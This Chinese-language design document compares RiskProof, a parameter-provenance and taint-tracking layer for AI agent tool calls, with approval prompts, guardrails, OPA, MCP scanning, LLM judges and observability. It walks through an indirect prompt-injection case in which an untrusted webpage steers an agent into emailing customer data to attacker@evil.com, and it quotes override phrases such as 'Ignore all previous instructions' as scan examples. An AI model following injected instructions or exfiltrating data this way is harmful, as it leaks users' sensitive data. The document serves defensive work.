# RiskProof 与现有 Agent 安全方案横向对比

## 对比维度说明

每条方案从 6 个维度评估：

| 维度 | 含义 |
|------|------|
| **参数级来源追踪** | 能否回答"send_email 的 to 字段具体从哪来的" |
| **确定性** | 安全裁决是否可复现、可测试、不依赖 LLM |
| **解释性** | 能否向用户解释"为什么这个操作有风险" |
| **可审计** | 是否产生结构化、可持久化的决策证明 |
| **集成复杂度** | 接入现有 Agent 框架需要多少改动 |
| **覆盖范围** | 能防御哪些类型的攻击 |

当前实现还增加了普通 approval/guardrail 对比中经常缺失的四个系统安全维度：

| 新维度 | RiskProof 当前机制 | 诚实边界 |
|---|---|---|
| Tool identity continuity | 完整 descriptor canonical digest、TOFU/pinned manifest、sticky quarantine | TOFU 不认证首次来源；hash 不证明后端诚实 |
| Task-scoped authority | Host-held contract 绑定 tool/version/source/expiry/budget | 结构授权，不是语义 task-alignment oracle |
| Temporal composition | 同 proxy 的 EIT→PAT→NAT metadata state machine | 多个独立 proxy 尚无共享 ledger |
| Bidirectional protocol mediation | 双向方法 allowlist、server request 默认拒绝、response correlation/normalization | 尚无完整远程认证、OAuth 和所有协议版本协商 |

因此最准确的比较单元已经不再只是“某次 prompt 是否恶意”，而是：

```text
哪个来源/版本的工具
  × 哪个 Host 授权的任务
  × 哪些参数与数据来源
  × 在怎样的历史轨迹中
  × 通过哪个协议动作产生什么副作用
```

---

## 一、方案总览

```
┌──────────────────────────────────────────────────────────────────┐
│                        Agent 安全方案地图                          │
│                                                                  │
│  执行前 ────────────────────────────────────────── 执行后         │
│                                                                  │
│  [HITL Approval]  [Guardrails]  [RiskProof]  [Observability]     │
│       │                │             │              │            │
│  只展示动作        检测输入/输出   来源+污点+策略   事后分析        │
│  无风险上下文      无参数来源      +风险解释      无执行前拦截     │
│                                                                  │
│  [OPA Policy]      [MCP Scan]    [LLM-as-Judge]                  │
│       │                │             │                            │
│  策略判断强         静态扫描      用 LLM 判断风险                  │
│  解释性弱          不覆盖运行时    不确定性高                      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 二、逐方案详细对比

### 2.1 普通 HITL Approval（如 LangGraph interrupt、OpenAI Agents SDK approval）

**代表方案**：LangGraph `interrupt()` / `interrupt_before`，OpenAI Agents SDK `RunConfig.approval_callbacks`

**工作方式**：
```python
# LangGraph 典型写法
@tool
def send_email(to: str, body: str):
    """Send an email."""
    # 框架在执行前暂停，展示给用户：
    # "Agent wants to call send_email(to='attacker@evil.com', body='...')"
    # [Approve] [Reject]
    pass
```

| 维度 | 评价 | 说明 |
|------|------|------|
| 参数级来源追踪 | ❌ 无 | 只显示参数值，不显示来源 |
| 确定性 | ✅ 高 | 用户直接决策 |
| 解释性 | ❌ 差 | "Agent 要发邮件"——然后就没了 |
| 可审计 | ⚠️ 部分 | 框架可能记录 approve/reject，但不记录 why |
| 集成复杂度 | ✅ 低 | 框架内置，零额外接入 |
| 覆盖范围 | ❌ 窄 | 依赖用户自己判断风险，容易变成橡皮图章 |

**典型问题**：
```
用户看到: Agent wants to call send_email(to="attacker@evil.com", body="客户名单...")
用户不知道:
  - to 地址来自不可信网页（间接 prompt injection）
  - body 包含客户敏感数据
  - 批准后可能违反数据外发策略
→ 用户点击 Approve。数据泄露。
```

---

### 2.2 Prompt Guardrail（NVIDIA NeMo Guardrails / Guardrails AI / LLM Guard）

**代表方案**：NVIDIA NeMo Guardrails、Guardrails AI、Meta Llama Guard、OpenAI Moderation API

**工作方式**：
```python
# 典型 Guardrails 写法
guard = Guard()
result = guard.validate(
    user_input="Ignore all previous instructions...",  # 检查输入
    llm_output="I'll help you with that..."            # 检查输出
)
if result.failed:
    raise SafetyException(result.reason)
```

| 维度 | 评价 | 说明 |
|------|------|------|
| 参数级来源追踪 | ❌ 无 | 只检查文本内容是否违规，不追踪参数来源 |
| 确定性 | ⚠️ 部分 | 关键词/规则部分是确定的，LLM judge 部分不确定 |
| 解释性 | ⚠️ 部分 | 能告诉你"内容包含敏感信息"，但不能告诉你"从哪来的" |
| 可审计 | ⚠️ 部分 | 有拦截记录，但无参数级证据链 |
| 集成复杂度 | ✅ 低 | 成熟的库，API 简单 |
| 覆盖范围 | ⚠️ 中 | 覆盖对话安全，不覆盖工具执行安全 |

**核心差异**：
```
Guardrail 关心: "这段文本是否包含恶意内容？"
RiskProof 关心:  "这个工具调用的每个参数从哪来、携带什么风险、会造成什么后果？"

Guardrail 视角（平面）:
  Input → [Guardrail] → Safe/Unsafe

RiskProof 视角（有深度的）:
  webpage → Agent Context → LLM → tool_call.args.to
                                   → tool_call.args.body
  [追踪每一条数据的流动链路]
```

---

### 2.3 OPA / Rego Policy-as-Code

**代表方案**：Open Policy Agent (OPA)、Styra、Cedar (AWS)

**工作方式**：
```rego
# OPA 策略示例
package agent.security

deny[msg] {
  input.tool == "send_email"
  input.args.to_domain == "external"
  contains_sensitive_data(input.args.body)
  msg := "敏感数据不能发送到外部邮箱"
}
```

| 维度 | 评价 | 说明 |
|------|------|------|
| 参数级来源追踪 | ❌ 不负责采集 | OPA 可以评估任意 input，但不会自动观察 MCP 上下文或生成来源链 |
| 确定性 | ✅ 高 | Rego 是声明式策略语言，100% 确定 |
| 解释性 | ⚠️ 部分 | 能告诉你"命中了哪条策略"，但不能解释"参数为什么有风险" |
| 可审计 | ✅ 好 | 决策日志 + 策略版本管理成熟 |
| 集成复杂度 | ⚠️ 中 | 需要部署 OPA 运行时或 WASM 嵌入 |
| 覆盖范围 | ⚠️ 中 | 策略判断能力强，但依赖 input 数据质量 |

**核心差异**：
```
OPA 是一个策略引擎；RiskProof 既保留内置确定性规则，也能嵌入预编译 OPA WASM。

但关键区别在于 input 的质量:
  OPA input:    { tool: "send_email", args: { to: "evil@x.com" } }
  RiskProof input: {
    tool: "send_email",
    args: { to: "evil@x.com" },
    provenance: { to: ["untrusted_webpage"] },  ← RiskProof 自动采集/映射
    taints:     { to: ["UNTRUSTED_WEB"] },      ← RiskProof 推断并传播
  }

OPA 策略可以写:
  "如果收件人是外部域名且正文含 customer 关键词 → deny"

如果集成方只给 OPA 原始 tool/args，它无法写:
  "如果收件人地址来自不可信网页 → deny"
  因为原始 input 没有"来源"这个维度的数据。

RiskProof 会把增强后的 argument evidence 一并交给内置规则和 OPA 模块：
RiskProof = 数据增强层（provenance + taint） + 内置规则 + OPA/Rego 扩展
```

---

### 2.4 MCP 工具静态扫描

**代表方案**：MCP 官方安全指南、Claude Code MCP tool validation、MCP Inspector

**工作方式**：
```bash
# 扫描 MCP 服务器的 tool description 和 schema
# 检查是否有: ignore previous instructions / exfiltrate / bypass security 等
```

| 维度 | 评价 | 说明 |
|------|------|------|
| 参数级来源追踪 | ❌ 无 | 只扫描工具定义，不追踪运行时参数来源 |
| 确定性 | ✅ 高 | 关键词/正则匹配 |
| 解释性 | ❌ 差 | 只能告诉你"工具描述可疑"，不涉及具体调用 |
| 可审计 | ⚠️ 部分 | 可以记录哪些工具被标记为可疑 |
| 集成复杂度 | ✅ 低 | 通常作为前置检查 |
| 覆盖范围 | ❌ 窄 | 只覆盖 schema 投毒一种攻击 |

**核心差异**：
```
MCP Scan: 在工具注册阶段看 tool schema 是否可疑（静态）
RiskProof: 在工具调用阶段看具体参数是否危险（运行时 + 有上下文）

例子:
  一个 MCP 工具本身描述完全正常: "Send email notification to users"
  但 Agent 把它用在了危险场景: to 来自不可信网页, body 含客户数据

  MCP Scan:  ❌ 放行（工具描述没问题）
  RiskProof: ⚠️ ask_approval（参数来源和内容有问题）

两者互补，不是替代关系。RiskProof 的 MCP Proxy 同时做了这两件事。
```

---

### 2.5 LLM-as-Judge（用 LLM 判断风险）

**代表方案**：用另一个 LLM（如 GPT-4、Claude）来审查 Agent 的工具调用是否安全

**工作方式**：
```python
# 典型 LLM-as-Judge 写法
judge_prompt = f"""
You are a security auditor. Review this tool call:

Tool: {tool_name}
Arguments: {args}
Context: {agent_context}

Assess the risk level and explain your reasoning.
Respond with: {{"risk": "low|medium|high", "reason": "..."}}
"""
judgement = llm.judge(judge_prompt)
```

| 维度 | 评价 | 说明 |
|------|------|------|
| 参数级来源追踪 | ⚠️ 可能 | LLM 可以从 context 中推理来源，但不保证准确 |
| 确定性 | ❌ 差 | 同样的输入，LLM 可能给出不同的判断 |
| 解释性 | ✅ 好 | LLM 擅长生成自然语言解释 |
| 可审计 | ❌ 差 | 决策不可复现，审计价值低 |
| 集成复杂度 | ✅ 低 | 只是一个 API 调用 |
| 覆盖范围 | ⚠️ 中高 | 理论上可以覆盖很多场景，但可靠性不稳定 |

**核心差异**：
```
LLM-as-Judge 的问题不是能力不够，是不稳定：

同一输入问 3 次:
  第 1 次: risk=low,     reason="看起来是正常的业务邮件"
  第 2 次: risk=high,    reason="收件人来自不可信来源，可能是注入攻击"
  第 3 次: risk=medium,  reason="有一定风险但需要更多上下文"

安全决策需要确定性——你不能对审计员说"这个操作当时被判定为安全，虽然同样的输入现在判定为高危"。

RiskProof 的策略: LLM 只用于解释润色（formatCard 的人类语言部分），不做安全裁决。
         策略引擎本身是纯函数 → 同样的输入永远输出同样的 decision。
```

---

### 2.6 Observability / 事后分析（LangSmith / Arize / Datadog LLM）

**代表方案**：LangSmith、Arize Phoenix、Datadog LLM Observability、Helicone

**工作方式**：
```python
# 记录 Agent 的每一步操作
trace = {
    "steps": [
        {"type": "llm_call", "input": "...", "output": "..."},
        {"type": "tool_call", "tool": "send_email", "args": {...}},
    ]
}
# 事后在 Dashboard 中查看
```

| 维度 | 评价 | 说明 |
|------|------|------|
| 参数级来源追踪 | ⚠️ 部分 | 可以追踪调用链，但通常不做参数级来源分析 |
| 确定性 | ✅ 高 | 记录事实 |
| 解释性 | ❌ 差 | 展示数据，不做风险判断 |
| 可审计 | ✅ 好 | 完整的执行轨迹 |
| 集成复杂度 | ✅ 低 | 成熟的 SDK |
| 覆盖范围 | ❌ 窄（无拦截） | 只在事后分析，不能在执行前阻断 |

**核心差异**：
```
Observability: "昨天 Agent 发了一封邮件到 evil.com，数据已经泄露了，
               我们来看看是怎么发生的。"（事后诸葛亮）

RiskProof:    "Agent 即将发邮件到 evil.com，这个收件人来自不可信网页，
               请确认是否批准。"（执行前拦截）

两者互补：Observability 做全局监控，RiskProof 做高风险工具调用的执行前卡点。
```

---

### 2.7 学术路线：Information Flow Control / Taint Tracking（Microsoft FIDES / NeuroTaint）

**代表方案**：Microsoft FIDES（CCS 2025）、NeuroTaint（USENIX 2025）

**工作方式**（以 FIDES 为例）：
```
1. 在 Agent context 构建时，给每条数据打 confidenciality / integrity label
2. Labels 随数据在 Agent 内部流动
3. 在 tool call 这个 sink 点，检查 label 是否允许
```

| 维度 | 评价 | 说明 |
|------|------|------|
| 参数级来源追踪 | ✅ 有 | 理论基础完善，精确到每个 token |
| 确定性 | ✅ 高 | label 传播规则是确定的 |
| 解释性 | ✅ 好 | 可以展示完整的信息流图 |
| 可审计 | ✅ 好 | 结构化的信息流记录 |
| 集成复杂度 | ❌ 高 | 需要修改 Agent 框架内部的数据流 |
| 覆盖范围 | ✅ 宽 | 覆盖所有信息流路径 |

**核心差异**：
```
FIDES / NeuroTaint 是学术界最接近 RiskProof 思路的工作。

关键区别:
  学术方案: 需要侵入 LLM 推理过程（改 context builder、改 tokenizer、捕获 attention）
           → 学术原型可行，工业落地困难
           → 需要 LLM 框架层面的支持，不是"可插拔"的

  RiskProof: 在 Agent 和工具之间的"夹层"做
           → 不侵入 LLM，不依赖特定模型
           → 对接入的 Agent 框架无要求
           → 核心模型与厂商无关；当前已验证 MCP、JS/TS、HTTP 和 LangGraph Python 接入

RiskProof 可以说是在 FIDES 的思路上做了工程化折中：
  保留核心洞察（provenance + taint → policy）
  简化实现（不做 token 级追踪，做参数级追踪）
  降低集成门槛（放在 Proxy 层，不做框架侵入）
```

---

## 三、综合对比矩阵

```
                    来源追踪  确定性  解释性  可审计  集成度  覆盖面
普通 HITL Approval    ❌      ✅      ❌      ⚠️     ✅      ❌
Prompt Guardrail      ❌      ⚠️      ⚠️      ⚠️     ✅      ⚠️
OPA / Rego           ❌      ✅      ⚠️      ✅      ⚠️      ⚠️
MCP 静态扫描          ❌      ✅      ❌      ⚠️     ✅      ❌
LLM-as-Judge         ⚠️      ❌      ✅      ❌      ✅      ⚠️
Observability        ⚠️      ✅      ❌      ✅      ✅      ❌
IFC 学术方案          ✅      ✅      ✅      ✅      ❌      ✅
RiskProof            ✅      ✅      ✅      ✅      ✅      ⚠️
                      ↑               ↑               ↑
                   参数级来源       LLM 只润色      覆盖 7 种工具类
                   追踪是核心      不参与裁决      21 条单次规则 + 工具链守卫 + OPA
```

---

## 四、RiskProof 的独特定位

```
RiskProof 不是替代任何现有方案，而是填补了一个空白：

┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  现有方案能做的事:                                             │
│                                                              │
│  Guardrail ──────── "这段对话是否违规"                         │
│  OPA ────────────── "这个操作是否违反策略"                      │
│  MCP Scan ──────── "这个工具定义是否被投毒"                     │
│  HITL Approval ─── "用户，批不批准"                            │
│  Observability ─── "事后看发生了什么"                          │
│                                                              │
│  RiskProof 填补的空白:                                         │
│                                                              │
│  "这个工具调用的每个参数——                                     │
│     从哪来的？     ← Provenance                               │
│     携带什么风险？  ← Taint                                    │
│     违反什么策略？  ← Policy                                   │
│     会造成什么后果？ ← Consequence                              │
│     应该怎么处理？   ← Recommendation                          │
│   ——以及以上所有判断的可审计证明"  ← Proof                       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## 五、与其他方案的关系（不是替代，是组合）

```
推荐的安全栈:

  Layer 1: MCP 静态扫描     ← 注册时过滤投毒工具
  Layer 2: Prompt Guardrail ← 对话内容安全
  Layer 3: RiskProof        ← 工具调用风险感知批准（本文方案）
  Layer 4: OPA / Policy     ← 全局企业策略（现已通过预编译 WASM 集成）
  Layer 5: Observability    ← 事后审计 + 全局监控

  RiskProof 的独特作用在 Layer 3：
  它连接了 Layer 2（发现内容有问题）和 Layer 4（执行策略判断），
  提供了"参数级来源解释"这个其他层都做不到的能力。
```

---

## 六、面试总结：一句话说清 RiskProof 的差异

> 普通 HITL 批准只告诉用户"Agent 要做什么"，RiskProof 告诉用户"参数从哪来、携带什么风险、违反什么策略、会造成什么后果"。它不是一个通用的安全平台，而是一个在"高风险工具调用执行前"这个精准时刻，提供参数级风险证据和可审计决策证明的窄而硬的安全组件。
